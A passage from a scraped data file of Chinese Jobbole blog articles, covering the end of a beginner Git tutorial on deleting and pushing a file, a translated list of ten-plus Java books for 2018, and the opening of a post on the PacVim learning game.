<code>file.txt</code> 被修改，对于 Git 来说它是一个 <code>new file</code>，Git 在此之前并不知道。现在我们已经为 Git 添加了 <code>file.txt</code>，我们可以提交更改并将其推送到 <code>origin/master</code>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/b9726595fac48135765596f41e98112c.png\" alt=\"\"></p>\n<p>Git 现在已经将这个新文件上传到 GitHub；如果刷新 GitHub 页面，则应该在 GitHub 上的仓库中看到新文件 <code>file.txt</code>。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/deb4e163d789a2e959251df26e0ef9cc.png\" alt=\"\"></p>\n<p>通过这些步骤，你可以创建尽可能多的文件，将它们添加到 Git 中，然后提交并将它们推送到 GitHub。</p>\n<h3 id=\"toc_5\">从 Git 中删除文件</h3>\n<p>如果我们发现我们犯了一个错误，并且需要从我们的仓库中删除 <code>file.txt</code>，该怎么办？一种方法是使用以下命令从本地副本中删除文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a62c792498019\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nrm file.txt\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a62c792498019-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a62c792498019-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a62c792498019-1\"><span class=\"crayon-e\">rm </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a62c792498019-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>如果你现在做 <code>git status</code>，Git 就会说有一个文件 <code>not staged for commit</code>（未筹划提交），并且它已经从仓库的本地拷贝中删除了。如果我们现在运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a62f768086428\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit add file.txt\r\ngit status\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a62f768086428-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a62f768086428-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a62f768086428-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a62f768086428-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-e\">add </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a62f768086428-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-i\">status</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a62f768086428-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>我知道我们正在删除这个文件，但是我们仍然运行 <code>git add</code>，因为我们需要告诉 Git 我们正在做的<strong>更改</strong>，<code>git add</code> 可以用于我们添加新文件、修改一个已存在文件的内容、或者从仓库中删除文件时。实际上，<code>git add</code> 将所有更改考虑在内，并将这些筹划提交这些更改。如果有疑问，请仔细查看下面终端屏幕截图中每个命令的输出。</p>\n<p>Git 会告诉我们已删除的文件正在进行提交。只要你提交此更改并将其推送到 GitHub，该文件也将从 GitHub 的仓库中删除。运行以下命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe06a633297077753\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ngit commit -m \"Delete file.txt\"\r\ngit push -u origin master\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a633297077753-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe06a633297077753-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe06a633297077753-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe06a633297077753-1\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Delete file.txt\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe06a633297077753-2\"><span class=\"crayon-e\">git </span><span class=\"crayon-v\">push</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">u</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">origin </span><span class=\"crayon-i\">master</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe06a633297077753-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在你的终端看起来像这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/a702fafff9bde602d93411167d94710b.png\" alt=\"\"></p>\n<p>你的 GitHub 看起来像这样：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/4d86c6b7db708b054256542492880b21.png\" alt=\"\"></p>\n<p>现在你知道如何从你的仓库克隆、添加、修改和删除 Git 文件。本系列的下一篇文章将检查 Git 分支。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114104\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114104votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114104\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/02da8890d313b46cdbac49de0b7a5f2041adce48.jpg"},{"url_object_id": "0645d6761f7b849238e3183e177cfb24", "title": ["2018 年 Java 程序员必读的十本书"], "url": "http://blog.jobbole.com/113955/", "create_date": "2018/06/17", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/stack-of-books2.jpg"], "praise_nums": "2", "comment_nums": 0, "fav_nums": 6, "tags": "书籍与教程, java, 书籍", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/yizhe\">yizhe</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"http://www.java67.com/2018/02/10-books-java-developers-should-read-in.html\">Javin Paul </a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>大家好，如果你是一名 Java 程序员，正在考虑 2018 年读什么书，那么这篇文章正适合你。本文中，我将分享 10 本有关 Java、Spring 及其他相关技术的书籍。 这里面既有适合经验丰富的 Java 程序员的书，它们介绍了架构、云开发、微服务、Java 9、Spring 5，以及用于提高生产效率的 Kotlin。同时也照顾到了初级的、缺乏经验的、或正打算 2018 年开始入门 Java 的新手。</p>\n<p>同时，我也介绍了一些在 2018 年学习 Java 9 的书籍。有些已经针对 Java SE 9 全面更新，比如 《写给大忙人看的Java SE 9》和 《Java 9 编程入门官方教程》。</p>\n<p>如果你刚开始学习 Java 或者正打算要学，这些书都非常适合。不推荐读旧版本的书来入门，除非是《Head First Java》。</p>\n<p>我特别希望《Head First Java》的第三版是一个长期的版本，作者和出版方最好针对 Java 8 和 Java 9 进行全面更新。不过对于入门 Java 的编程小白来说，旧版本的《Head First Java》仍然是一本好书。</p>\n<p>我最近添加到这个书单的就是这本今天刚发现的《云原生 Java》。这本书看起来特别棒，它介绍了目前急需的，利用 Spring Boot、Spring Cloud 和 Cloud Foundry 在云上开发 Java 应用的知识。虽然还没读完，但它看起来特别棒。</p>\n<p>2018 年可以用来提升 Java 知识技能的书太多了，你不可能把他们都读完。不过有些书你绝对不想错过，比如《Effective Java（第三版）》，我把它放在了书单的最上面。</p>\n<p>书单里的书介绍了 Java 9、Spring 5、Kotlin、软件架构、微服务、云以及 Java 8 的一些特性。</p>\n<p>这个书单不是很长，但里面的书都很棒，都挺适合在上下班路上读。</p>\n<h3>1. 《Effective Java（第三版）》（Effective Java 3rd Edition）</h3>\n<p>如果你还没读过这本书，那它绝对是 2018 年你必须读的第一本书。第三版是一个长期版本，其实它早就该出版了。这版书也囊括了 JDK 7、8、9 的新特性。</p>\n<p>我在 1 月份的第一个星期就拿到了这本书，它绝对是约书亚·布洛克（Joshua Bloch）给 Java 程序员最好的新年礼物。</p>\n<p>我花了大概一个星期就读完了这本书。我发现读的过程中，时常碰到新的知识点，特别是关于 Java 8 和 Java 9 的。</p>\n<p>我从这本书中学到了 Java 的模块化，它也帮我理顺了之前对于 Java 8 的一些误解。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/4835b82477bba7a02b19e0655a1bec19.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/4835b82477bba7a02b19e0655a1bec19-231x300.jpg\" alt=\"effective java\"></a></p>\n<h3>2. 《现代 Java 开发范例》（Modern Java Recipes）</h3>\n<p>如果你喜欢范例类型的书，那这本书就很不错。就像简介里提到的，这本书提供了解决 Java 8 和 Java 9 中一些难题的简单方案。</p>\n<p>你会学到如何使用 Java 8 的 lambda 表达式、方法引用以及 Stream API 写代码。</p>\n<p>如果你想通过手册和范例来学习 Java 8 和 Java 9 ，这本书就很完美。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/10103a0f7df31fa02f1a6eb2ff884f67.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/10103a0f7df31fa02f1a6eb2ff884f67-229x300.jpg\" alt=\"modern java recipes\"></a></p>\n<h3>3. 《Java 9 模块化》（Java 9 Modularity）</h3>\n<p>Java 9 的一个亮点就是 Java 的模块化，本书对这部分做了最全面的介绍。</p>\n<p>作者桑德斯·马克（Sanders Mak）是 Java 9 模块化的权威。我听过很多他讲 Java 9 的课程，比如在 Pluarlsight 做的《Java 9 模块化及新特性》。我可以保证，读完此书之后，你绝不会后悔。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/5fa3843943b0e8a3a222ac4ed7b47608.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/5fa3843943b0e8a3a222ac4ed7b47608-229x300.jpg\" alt=\"java 9 modularity\"></a></p>\n<h3>4. 《写给大忙人看的Java SE 9（第二版）》 （Core Java SE 9 for the Impatient (2nd Edition)）</h3>\n<p>如果你急着学 Java 那我推荐这本书给你。我是凯 S·霍斯特曼 (Cay S. Horstmann)的一个忠实粉丝，他的文采之优美、涉猎之广，都让我很是佩服。</p>\n<p>你读了他写的关于 Java 8、Scala 的书以及《Java 核心编程》之后，绝对也会成为他的粉丝。</p>\n<p>这本书已经针对 Java SE 9 全面更新。如果你想学习 Java 9，那2018年你应该先读读这本书。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/d4bfce708107af712925d529c54d5e99.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/d4bfce708107af712925d529c54d5e99-230x300.jpg\" alt=\"core java se 9 for the impatient\"></a></p>\n<p> </p>\n<h3>5. 《Java 8入门》（Beginning Java 8 Language Features）</h3>\n<p>尽管已经发布快 4 年了，仍然有很多 Java 程序员还没有开始使用 Java 8。</p>\n<p>如果你是这些人的一员，或者还不是很理解 lambda 表达式、Stream API、Optional 及 Java 8 其他的特性，那你一定要读这本书。</p>\n<p>这是一个系列，共有3卷，此卷通俗易懂的讲解了 Java 8 的基础知识。</p>\n<p>另外两卷则延伸到 Java 8 的高级特性，比如 JDBC、Swing、 Java FX，以及 Java 网络 API。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/b2fdbde13702ef6ccc6e95c18fccc452.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/b2fdbde13702ef6ccc6e95c18fccc452-243x300.jpg\" alt=\"java 8 language feature\"></a></p>\n<h3>6. 《Spring 微服务实战》（Spring Microservices in Action）</h3>\n<p>软件开发世界正在加速转向微服务架构，它在开发、维护、部署、扩容性及可靠性等方面有很多优势。</p>\n<p>感谢 Spring framework 提供这么多开发微服务的 Java 工具，比如 Spring Boot 和 Spring Cloud。</p>\n<p>如果你对用 Spring framework 开发微服务有兴趣，那么这本书很适合你。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/0c7932ef6b030895a79464812a84700d.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/0c7932ef6b030895a79464812a84700d-239x300.jpg\" alt=\"Spring microservices in action\"></a></p>\n<h3>7. 《架构整洁之道》（Clean Architecture）</h3>\n<p>我是在2017年读的这本书，特别喜欢。我是罗伯特 C·马丁（Robert C. Martin）的一个忠实粉丝（大家称之为“ Bob 大叔”）。加上之前的《代码整洁之道（Clean Code）》和《代码整洁之道 程序员的职业素养（Clean Coder book）》，这本书完成了代码整洁之道三部曲。</p>\n<p>它介绍了如何构建可以经受时间考验的软件架构，还消除了对设计模式和软件架构的一些误解。</p>\n<p>如果你是一名经验丰富的 Java 程序员，正想转变为一个方案设计师，那这本书2018年你一定要读完。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/16c675023e54c1156f685331fe2ba77f.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/16c675023e54c1156f685331fe2ba77f-244x300.jpg\" alt=\"clean architecture\"></a></p>\n<h3>8. 《Spring 5 开发范例代码大全》（Spring 5 Recipes: A Problem-Solution Approach）</h3>\n<p>抛开 JDK 9 不谈，2017年另外一个大的版本更新就是 Spring 5 ，它将响应式编程引入了 Spring 。</p>\n<p>既然对 Java 程序员来说， Spring 是无可争议的、最流行的架构，那么学习 Spring 5 让自己紧跟技术潮流，是非常值得的。</p>\n<p>我个人非常喜欢目标导向的范例类图书，这也是我为什么选择了这本书用来学习 Spring 5。</p>\n<p>它不仅覆盖了 Spring 5 的新特性，也讲了其他早期版本的增强。一句话，它教你如何在 Spring 5 的环境下写代码。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/5b90e8a41700678ed1c5089d36b03b7b.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/5b90e8a41700678ed1c5089d36b03b7b-210x300.jpg\" alt=\"Spring 5 Recipes\"></a></p>\n<p> </p>\n<h3>9. 《Kotlin 实战》（Kotlin in Action）</h3>\n<p>Java 程序员通过学习 Scala、Groovy、Closure 等 JVM 语言来成为一名多语言的开发者是很常见的。而 Kotlin 正是当下的热门。</p>\n<p>自从 2017 年 Google 在 Google IO 上宣布将 Kotlin 作为 Android 的官方语言之后，很多人都开始对学习 Kotlin 感兴趣。</p>\n<p>更重要的是，它能提高你的生产效率，而且它和 Java 非常相似。因此，如果你想在 2018 年学习一种 JVM 语言，我建议学习 Kotlin。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/4e8ec3dcf9fc58481dd1f235a706ac49.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/4e8ec3dcf9fc58481dd1f235a706ac49-239x300.jpg\" alt=\"kotlin in action\"></a></p>\n<h3>10. 《Java 9 编程入门官方教程(第七版)》（Java: A Beginner’s Guide, Seventh Edition）</h3>\n<p>这是另一本从零开始学习 Java 的经典书籍。第七版已经针对 Java SE 9 全面更新。</p>\n<p>如果你想在 2018 年开始你的 Java 程序员生涯，这本书可以帮你学到最新版本的 Java。</p>\n<p>这本书比书单里的第二本更全面。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/68129204cb656d6f7e0c4d4b65b7b727.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/68129204cb656d6f7e0c4d4b65b7b727-241x300.jpg\" alt=\"java a beginner\"></a></p>\n<p> </p>\n<h3>11. 《云原生 Java》（Cloud Native Java）</h3>\n<p>恭喜读到这里的朋友，你们收获了一个彩蛋 ——《云原生 Java》，2018 年最有用的 Java 书籍。</p>\n<p>当今的软件开发，大都是关于云、微服务、分布式架构等等。乔氏·隆（Josh Long）和肯尼·巴斯塔尼（Kenny Bastani）在这本书里向 Java/JVM 开发者展示了如何使用 Spring Boot、Spring Cloud 和 Cloud Foundry 构建更好、更快的 Java 应用程序。</p>\n<p>对于经验丰富的 Java 开发者来说，它绝对是一本必读书。尽管它介绍了相对高级的内容，我还是强烈推荐每一位 Java 程序员都读一下。</p>\n<p>实际上，我还没有读完这本书。但是读完前言之后，我就对所讨论的话题非常感兴趣。我可能在读完之后再写一篇详细的文章。但它绝对值得各位至少读一遍。</p>\n<p><a href=\"http://jbcdn2.b0.upaiyun.com/2018/03/50634ad6517cc268b7e595a1a3799b9e.jpg\"><img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/50634ad6517cc268b7e595a1a3799b9e-229x300.jpg\" alt=\"cloud native java\"></a></p>\n<p>这就是 2018 年 Java 程序员可以读的一些有趣、有用的书籍。实话实说，即使是让自己紧跟 Java 世界的技术潮流，比如 Java 9、Sprig 5、微服务、Kotlin 等，也还有一大堆东西等着你去学习。这些书不仅仅更新你的知识，还能让你对一些技术的理解更加深刻。</p>\n<p>多谢阅读。如果你喜欢这些书，就把它们分享给你的朋友和同学吧。如果有任何建议，或有书籍想在2018年分享给大家，欢迎留言。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113955\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113955votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113955\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/yizhe\">yizhe</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/yizhe\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2018/03/4d71b9b6d5a7e0f78b88a7a273cddd74.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            JAVA软件工程师        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/yizhe\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/yizhe/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/yizhe/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 11</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/b09da3ea14a596f136aeea129afb4a2ac85bce08.jpg"},{"url_object_id": "f852671c846c5a0304c03ce2522024c6", "title": ["PacVim：一个学习 vim 命令的命令行游戏"], "url": "http://blog.jobbole.com/114134/", "create_date": "2018/06/19", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "IT技术, Linux, Vim", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.ostechnix.com/pacvim-a-cli-game-to-learn-vim-commands/\">Sk</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9738-1.html?pr\">Linux中国/geekpi</a>   </div><p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/57beea594a88813722998ea81bc96125.png\" alt=\"\"></p>\n<p>你好，Vim用户！今天，我偶然发现了一个很酷的程序来提高 Vim 的使用技巧。Vim 是编写和编辑代码的绝佳编辑器。然而，你们中的一些人（包括我）仍在陡峭的学习曲线中挣扎。再也不用了！来看看 <strong>PacVim</strong>，一款可帮助你学习 Vim 命令的命令行游戏。PacVim 的灵感来源于经典游戏 <a href=\"https://en.wikipedia.org/wiki/Pac-Man\">PacMan</a>，它以一种好玩有趣的方式为你提供了大量的 Vim 命令练习。简而言之，PacVim 是一种深入了解 vim 命令的有趣而自由的方式。请不要将 PacMan 与 <a href=\"https://www.ostechnix.com/getting-started-pacman/\">pacman</a> （arch Linux 包管理器）混淆。 PacMan 是 20 世纪 80 年代发布的经典流行街机游戏。</p>\n<p>在本简要指南中，我们将看到如何在 Linux 中安装和使用 PacVim。</p>\n<h3 id=\"toc_1\">安装 PacVim</h3>\n<p>首先按如下链接安装 <strong>Ncurses</strong> 库和<strong>开发工具</strong>。</p>\n<ul>\n<li><a href=\"https://www.ostechnix.com/how-to-install-ncurses-library-in-linux/\">如何在 Linux 